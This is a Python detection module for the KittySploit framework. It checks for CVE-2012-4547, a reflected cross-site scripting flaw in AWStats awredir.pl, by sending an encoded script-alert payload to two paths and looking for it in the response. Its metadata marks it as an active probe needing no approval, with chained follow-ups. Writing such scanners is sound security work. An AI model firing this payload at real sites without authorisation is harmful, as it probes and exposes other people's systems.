#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""AWStats is prone to multiple cross-site scripting vulnerabilities because the application fails to properly sa."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': "AWStats 6.95/7.0 - 'awredir.pl' Cross-Site Scripting Detection",
        'description': 'AWStats is prone to multiple cross-site scripting vulnerabilities because the application fails to properly sanitize user-supplied input.',
        'author': ['KittySploit Team'],
        'severity': 'medium',
        'tags': ['web', 'scanner', 'cve', 'cve2012', 'xss', 'awstats', 'edb', 'laurent_destailleur', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 2,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': ['auxiliary/scanner/http/login_page_detector'],
            },
        },
        'references': [
            'https://www.exploit-db.com/exploits/36164',
            'https://nvd.nist.gov/vuln/detail/CVE-2012-4547',
            'http://awstats.sourceforge.net/docs/awstats_changelog.txt',
            'http://openwall.com/lists/oss-security/2012/10/29/7',
            'http://openwall.com/lists/oss-security/2012/10/26/1',
        ],
        'cve': 'CVE-2012-4547',
    }

    def run(self):
        for path in ('/awstats/awredir.pl?url=%3Cscript%3Ealert(document.domain)%3C/script%3E', '/cgi-bin/awstats/awredir.pl?url=%3Cscript%3Ealert(document.domain)%3C/script%3E'):
            r = self.http_request(method="GET", path=path, allow_redirects=False)
            if not r or r.status_code != 200:
                continue
            body = r.text or ""
            headers = "\n".join(f"{k}: {v}" for k, v in r.headers.items())
            body_any = ('<script>alert(document.domain)</script>',)
            header_any = ('text/html',)
            if (any(m in body for m in body_any)) and (any(m in headers for m in header_any)):
                self.set_info(
                    severity='medium',
                    reason="AWStats 6.95/7.0 - 'awredir.pl' Cross-Site Scripting" + " detected",
                    path=path,
                )
                return True
        return False

